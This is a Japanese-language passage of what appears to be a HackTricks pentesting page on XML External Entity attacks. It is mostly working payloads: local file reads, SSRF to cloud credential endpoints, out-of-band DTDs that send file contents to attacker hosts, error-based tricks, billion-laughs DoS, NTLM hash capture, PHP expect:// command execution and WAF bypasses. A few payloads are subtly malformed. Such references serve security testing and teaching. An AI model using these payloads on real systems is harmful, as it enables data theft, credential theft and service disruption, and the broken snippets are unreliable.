# XXE - XEE - XML External Entity

{{#include ../banners/hacktricks-training.md}}

## XMLの基本

XMLはデータの保存と輸送のために設計されたマークアップ言語で、記述的に名前付けされたタグを使用する柔軟な構造を特徴としています。XMLは、あらかじめ定義されたタグのセットに制限されない点でHTMLとは異なります。JSONの台頭に伴い、XMLの重要性は低下していますが、当初はAJAX技術において重要な役割を果たしていました。

- **エンティティによるデータ表現**: XMLのエンティティは、`&lt;`や`&gt;`のような特殊文字を含むデータの表現を可能にし、これらはそれぞれ`<`と`>`に対応し、XMLのタグシステムとの衝突を避けます。
- **XML要素の定義**: XMLは要素の型を定義することを可能にし、要素がどのように構造化され、どのような内容を含むことができるかを概説します。内容は任意のタイプから特定の子要素までさまざまです。
- **文書型定義 (DTD)**: DTDはXMLにおいて文書の構造と含むことができるデータの型を定義するために重要です。DTDは内部、外部、またはその組み合わせであり、文書のフォーマットと検証方法をガイドします。
- **カスタムおよび外部エンティティ**: XMLは、柔軟なデータ表現のためにDTD内でカスタムエンティティの作成をサポートします。URLで定義された外部エンティティは、特にXML外部エンティティ（XXE）攻撃の文脈でセキュリティ上の懸念を引き起こします。これは、XMLパーサーが外部データソースを処理する方法を悪用します: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **パラメータエンティティによるXXE検出**: 特にパーサーのセキュリティ対策により従来の方法が失敗する場合、XMLパラメータエンティティを利用してXXE脆弱性を検出できます。これらのエンティティは、DNSルックアップや制御されたドメインへのHTTPリクエストをトリガーするなどのアウトオブバンド検出技術を可能にし、脆弱性を確認します。
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## 主な攻撃

[**これらの攻撃のほとんどは、素晴らしいPortswiggerのXEEラボを使用してテストされました: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### 新しいエンティティテスト

この攻撃では、シンプルな新しいエンティティ宣言が機能しているかどうかをテストします。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### ファイルを読む

`/etc/passwd`を異なる方法で読み取ってみましょう。Windowsの場合は、`C:\windows\system32\drivers\etc\hosts`を読み取ってみてください。

この最初のケースでは、SYSTEM "_\*\*file:///\*\*etc/passwd_" も機能することに注意してください。
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

この2番目のケースは、ウェブサーバーがPHPを使用している場合にファイルを抽出するのに役立ちます（Portswiggerのラボではない場合）。
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
この第三のケースでは、`Element stockCheck`をANYとして宣言していることに注意してください。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### ディレクトリリスト

**Java** ベースのアプリケーションでは、XXEを使用してペイロードのように（ファイルではなくディレクトリを要求することで）**ディレクトリの内容をリストする**ことが可能な場合があります：
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXEを使用して、クラウド内のSSRFを悪用することができます。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

使用している**以前にコメントされた技術**を使って、サーバーがあなたが制御するサーバーにアクセスさせて脆弱性を示すことができます。しかし、それが機能しない場合、**XMLエンティティが許可されていない**可能性があります。その場合は、**XMLパラメータエンティティ**を使用してみることができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - データをアウトオブバンドで抽出する

**この場合、サーバーに悪意のあるペイロードを含む新しいDTDを読み込ませ、ファイルの内容をHTTPリクエストで送信させます（複数行のファイルの場合、例えばこの基本サーバーを使用して\_ftp://**\_経由で抽出を試みることができます[**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**）。この説明は**[**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**に基づいています。**

与えられた悪意のあるDTDでは、データを抽出するために一連の手順が実行されます：

### 悪意のあるDTDの例：

構造は次のようになります：
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
このDTDによって実行されるステップは次のとおりです：

1. **パラメータエンティティの定義:**
- XMLパラメータエンティティ`%file`が作成され、`/etc/hostname`ファイルの内容を読み取ります。
- 別のXMLパラメータエンティティ`%eval`が定義されます。これは動的に新しいXMLパラメータエンティティ`%exfiltrate`を宣言します。`%exfiltrate`エンティティは、攻撃者のサーバーにHTTPリクエストを行い、URLのクエリ文字列内に`%file`エンティティの内容を渡すように設定されています。
2. **エンティティの実行:**
- `%eval`エンティティが利用され、`%exfiltrate`エンティティの動的宣言が実行されます。
- 次に`%exfiltrate`エンティティが使用され、ファイルの内容を持つ指定されたURLへのHTTPリクエストがトリガーされます。

攻撃者は、この悪意のあるDTDを自分の制御下にあるサーバーにホストし、通常は`http://web-attacker.com/malicious.dtd`のようなURLで提供します。

**XXEペイロード:** 脆弱なアプリケーションを悪用するために、攻撃者はXXEペイロードを送信します：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
このペイロードは、XMLパラメータエンティティ`%xxe`を定義し、それをDTD内に組み込みます。XMLパーサーによって処理されると、このペイロードは攻撃者のサーバーから外部DTDを取得します。パーサーはその後、DTDをインラインで解釈し、悪意のあるDTDに記載された手順を実行し、`/etc/hostname`ファイルを攻撃者のサーバーに流出させます。

### エラーベース（外部DTD）

**この場合、サーバーが悪意のあるDTDを読み込むようにし、エラーメッセージ内にファイルの内容を表示させます（これはエラーメッセージが見える場合にのみ有効です）。** [**ここからの例。**](https://portswigger.net/web-security/xxe/blind)

悪意のある外部文書型定義（DTD）を使用して、`/etc/passwd`ファイルの内容を明らかにするXML解析エラーメッセージをトリガーできます。これは以下の手順で実現されます：

1. `file`という名前のXMLパラメータエンティティが定義され、`/etc/passwd`ファイルの内容が含まれます。
2. `eval`という名前のXMLパラメータエンティティが定義され、別のXMLパラメータエンティティ`error`の動的宣言を組み込みます。この`error`エンティティは評価されると、存在しないファイルを読み込もうとし、その名前として`file`エンティティの内容を組み込みます。
3. `eval`エンティティが呼び出され、`error`エンティティの動的宣言が行われます。
4. `error`エンティティの呼び出しは、存在しないファイルを読み込もうとし、`/etc/passwd`ファイルの内容をファイル名の一部として含むエラーメッセージを生成します。

悪意のある外部DTDは、以下のXMLで呼び出すことができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
実行時に、ウェブサーバーの応答には`/etc/passwd`ファイルの内容を表示するエラーメッセージが含まれるべきです。

![](<../images/image (809).png>)

_**外部DTDは、1つのエンティティを2番目のエンティティの中に含めることを許可しますが（\*\***`eval`\***\*）、内部DTDでは禁止されています。したがって、外部DTDを使用せずにエラーを強制することはできません（通常）。**_

### **エラーに基づく（システムDTD）**

では、**アウトオブバンドの相互作用がブロックされている**場合の盲目的なXXE脆弱性はどうでしょうか（外部接続が利用できない）？

XML言語仕様の抜け穴は、**文書のDTDが内部および外部宣言を混合する際にエラーメッセージを通じて機密データを露出させることができます**。この問題は、外部で宣言されたエンティティの内部再定義を可能にし、エラーに基づくXXE攻撃の実行を促進します。このような攻撃は、外部DTDで元々宣言されたXMLパラメータエンティティの再定義を利用します。サーバーによってアウトオブバンド接続がブロックされている場合、攻撃者は攻撃を実行するためにローカルDTDファイルに依存し、機密情報を明らかにするために解析エラーを誘発することを目指します。

サーバーのファイルシステムに`/usr/local/app/schema.dtd`にDTDファイルが含まれており、`custom_entity`というエンティティを定義しているシナリオを考えてみましょう。攻撃者は、次のようにハイブリッドDTDを提出することで、`/etc/passwd`ファイルの内容を明らかにするXML解析エラーを誘発できます。
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
このDTDによって実行される手順は以下の通りです：

- `local_dtd`という名前のXMLパラメータエンティティの定義には、サーバーのファイルシステム上にある外部DTDファイルが含まれています。
- 外部DTDで元々定義されていた`custom_entity` XMLパラメータエンティティの再定義が行われ、[エラーに基づくXXEエクスプロイト](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)をカプセル化します。この再定義は、パースエラーを引き起こし、`/etc/passwd`ファイルの内容を露出させることを目的としています。
- `local_dtd`エンティティを使用することで、外部DTDが呼び出され、新たに定義された`custom_entity`が含まれます。この一連のアクションにより、エクスプロイトが狙うエラーメッセージが発生します。

**実世界の例:** GNOMEデスクトップ環境を使用しているシステムでは、`/usr/share/yelp/dtd/docbookx.dtd`に`ISOamso`というエンティティを含むDTDが存在することがよくあります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

この技術は**内部DTDを使用するため、まず有効なものを見つける必要があります**。サーバーが使用しているのと同じ**OS / ソフトウェア**を**インストール**し、**いくつかのデフォルトDTDを検索する**か、システム内の**デフォルトDTDのリストを取得**して、どれかが存在するかを**確認**することができます：
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
より詳しい情報は[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)を確認してください。

### システム内のDTDを見つける

次の素晴らしいGitHubリポジトリでは、**システムに存在する可能性のあるDTDのパス**を見つけることができます：

{{#ref}}
https://github.com/GoSecure/dtd-finder/tree/master/list
{{#endref}}

さらに、**被害者システムのDockerイメージ**を持っている場合は、同じリポジトリのツールを使用して、**イメージ**を**スキャン**し、システム内に存在する**DTDのパス**を**見つける**ことができます。方法については[GitHubのReadme](https://github.com/GoSecure/dtd-finder)をお読みください。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

この攻撃の詳細な説明については、**[**この素晴らしい投稿**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **の第二セクションを確認してください**。

**Microsoft Office ドキュメントのアップロード機能は多くのウェブアプリケーションで提供されています**。これにより、これらのドキュメントから特定の詳細が抽出されます。たとえば、ウェブアプリケーションはユーザーが XLSX 形式のスプレッドシートをアップロードすることでデータをインポートできるようにする場合があります。パーサーがスプレッドシートからデータを抽出するためには、必然的に少なくとも1つのXMLファイルを解析する必要があります。

この脆弱性をテストするには、**XXEペイロードを含むMicrosoft Officeファイルを作成する必要があります**。最初のステップは、ドキュメントを解凍できる空のディレクトリを作成することです。

ドキュメントが解凍されたら、`./unzipped/word/document.xml` にあるXMLファイルを開き、好みのテキストエディタ（例えばvim）で編集します。XMLは、通常HTTPリクエストで始まる希望するXXEペイロードを含むように修正する必要があります。

修正されたXML行は、2つのルートXMLオブジェクトの間に挿入する必要があります。リクエスト用のモニタ可能なURLに置き換えることが重要です。

最後に、ファイルを圧縮して悪意のある poc.docx ファイルを作成できます。以前に作成した「unzipped」ディレクトリから、次のコマンドを実行する必要があります：

作成したファイルは、潜在的に脆弱なウェブアプリケーションにアップロードでき、Burp Collaborator のログにリクエストが表示されることを期待できます。

### Jar: protocol

**jar** プロトコルは、**Javaアプリケーション**内でのみアクセス可能です。これは、**PKZIP** アーカイブ（例：`.zip`、`.jar` など）内のファイルアクセスを可能にするように設計されており、ローカルファイルとリモートファイルの両方に対応しています。
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> PKZIPファイル内のファイルにアクセスできることは、**システムDTDファイルを介してXXEを悪用するのに非常に便利です。** [このセクションを確認して、システムDTDファイルを悪用する方法を学んでください](xxe-xee-xml-external-entity.md#error-based-system-dtd)。

PKZIPアーカイブ内のファイルにjarプロトコルを介してアクセスするプロセスは、いくつかのステップを含みます：

1. 指定された場所からzipアーカイブをダウンロードするためにHTTPリクエストが行われます。例えば、`https://download.website.com/archive.zip`のように。
2. アーカイブを含むHTTPレスポンスは、通常`/tmp/...`のような場所に一時的に保存されます。
3. アーカイブが抽出され、その内容にアクセスします。
4. アーカイブ内の特定のファイル`file.zip`が読み取られます。
5. 操作後、このプロセス中に作成された一時ファイルは削除されます。

このプロセスの2番目のステップで中断するための興味深い技術は、アーカイブファイルを提供する際にサーバー接続を無期限に開いたままにすることです。この目的のために、[このリポジトリ](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution)にあるツールを利用できます。これには、Pythonサーバー（`slow_http_server.py`）やJavaサーバー（`slowserver.jar`）が含まれます。
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> 一時ディレクトリにファイルを書き込むことは、**パス・トラバーサルに関わる別の脆弱性をエスカレートするのに役立つ可能性があります**（ローカルファイルインクルード、テンプレートインジェクション、XSLT RCE、デシリアライズなど）。

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml攻撃
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### 二次爆発攻撃

![](<../images/image (527).png>)

#### NTMLの取得

Windowsホストでは、responder.pyハンドラーを設定することで、ウェブサーバーユーザーのNTMLハッシュを取得することが可能です:
```bash
Responder.py -I eth0 -v
```
以下のリクエストを送信することによって
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Then you can try to crack the hash using hashcat

## Hidden XXE Surfaces

### XInclude

クライアントデータをサーバー側のXMLドキュメントに統合する際、バックエンドのSOAPリクエストのように、XML構造に対する直接的な制御はしばしば制限され、`DOCTYPE`要素の変更に対する制約により従来のXXE攻撃が妨げられます。しかし、`XInclude`攻撃は、XMLドキュメントの任意のデータ要素内に外部エンティティを挿入することを可能にすることで解決策を提供します。この方法は、サーバー生成のXMLドキュメント内のデータの一部のみを制御できる場合でも効果的です。

`XInclude`攻撃を実行するには、`XInclude`名前空間を宣言し、意図した外部エンティティのファイルパスを指定する必要があります。以下は、そのような攻撃がどのように構成されるかの簡潔な例です:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - ファイルアップロード

ユーザーが特定のアプリケーションにアップロードしたファイルは、サーバーで処理される際に、XMLまたはXMLを含むファイル形式の取り扱いにおける脆弱性を悪用する可能性があります。一般的なファイル形式であるオフィス文書（DOCX）や画像（SVG）は、XMLに基づいています。

ユーザーが**画像をアップロード**すると、これらの画像はサーバー側で処理または検証されます。PNGやJPEGなどの形式を期待するアプリケーションであっても、**サーバーの画像処理ライブラリはSVG画像もサポートしている可能性があります**。XMLベースの形式であるSVGは、攻撃者によって悪意のあるSVG画像を提出するために悪用され、サーバーがXXE（XML外部エンティティ）脆弱性にさらされる可能性があります。

以下にそのような攻撃の例を示します。悪意のあるSVG画像がシステムファイルを読み取ろうとしています：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
別の方法は、PHPの"expect"ラッパーを通じて**コマンドを実行**しようとすることです:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
SVG形式は、サーバーのソフトウェアのXML処理機能を悪用する攻撃を開始するために使用され、堅牢な入力検証とセキュリティ対策の必要性を強調しています。

Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

**読み込まれたファイルの最初の行または実行結果は、作成された画像の中に表示されます。したがって、SVGが作成した画像にアクセスできる必要があります。**

### **PDF - ファイルアップロード**

次の投稿を読んで、**PDFファイルをアップロードしてXXEを悪用する方法を学んでください**:

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### Content-Type: x-www-urlencodedからXMLへ

POSTリクエストがXML形式のデータを受け入れる場合、そのリクエストでXXEを悪用しようとすることができます。たとえば、通常のリクエストに次のような内容が含まれている場合:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
次のリクエストを送信できるかもしれません。同じ結果が得られます。
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: From JSON to XEE

リクエストを変更するには、「**Content Type Converter**」というBurp拡張機能を使用できます。[Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) でこの例を見つけることができます:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
別の例は[こちら](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)で見つけることができます。

## WAF & 保護のバイパス

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
この操作は、XMLサーバーが `data://` プロトコルを受け入れる場合にのみ機能します。

### UTF-7

ここで \[**"Encode Recipe**" of cyberchef\]を使用して、UTF-7に変換できます。
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ プロトコルバイパス

ウェブがPHPを使用している場合、`file:/`の代わりに**php wrappers**`php://filter/convert.base64-encode/resource=`を使用して**内部ファイル**にアクセスできます。

ウェブがJavaを使用している場合は、[**jar: プロトコル**](xxe-xee-xml-external-entity.md#jar-protocol)を確認してください。

### HTML エンティティ

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)からのトリック\
**エンティティ内のエンティティ**を作成し、**html エンティティ**でエンコードしてから、**dtdをロード**するために呼び出すことができます。\
使用する**HTML エンティティ**は**数値**である必要があります（例を参照してください）\[([https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)](<https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B>)\)。
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTDの例:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**抽出** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **外部リソースの抽出**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### リモートコード実行

**PHPの"expect"モジュールがロードされている場合**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

この例は[https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)にインスパイアされています。

XLIFF (XML Localization Interchange File Format) は、ローカリゼーションプロセスにおけるデータ交換を標準化するために利用されます。これは、主にローカリゼーション中にツール間でローカライズ可能なデータを転送するために使用されるXMLベースのフォーマットであり、CAT (Computer-Aided Translation) ツールの共通交換フォーマットとしても使用されます。

### Blind Request Analysis

サーバーに次の内容でリクエストが送信されます:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
しかし、このリクエストは内部サーバーエラーを引き起こし、特にマークアップ宣言に関する問題を示しています：
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
エラーにもかかわらず、Burp Collaboratorにヒットが記録されており、外部エンティティとの何らかのインタラクションが示されています。

Out of Band Data Exfiltration データを抽出するために、修正されたリクエストが送信されます：
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
このアプローチは、User AgentがJava 1.8の使用を示していることを明らかにします。このバージョンのJavaの制限の一つは、Out of Band技術を使用して、/etc/passwdのような改行文字を含むファイルを取得できないことです。

Error-Based Data Exfiltration この制限を克服するために、Error-Basedアプローチが採用されます。DTDファイルは、ターゲットファイルからのデータを含むエラーをトリガーするように次のように構成されています:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
サーバーはエラーで応答し、重要なことに存在しないファイルを反映し、サーバーが指定されたファイルにアクセスしようとしていることを示しています。
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
エラーメッセージにファイルの内容を含めるために、DTDファイルが調整されます:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
この変更により、HTTP経由で送信されるエラー出力に反映されるファイルの内容が正常に抽出されます。これは、機密情報を抽出するためにOut of BandおよびError-Based技術の両方を利用した成功したXXE（XML External Entity）攻撃を示しています。

## RSS - XEE

XXE脆弱性を悪用するためのRSS形式の有効なXML。

### Ping back

攻撃者のサーバーへのシンプルなHTTPリクエスト
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ファイルを読む
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
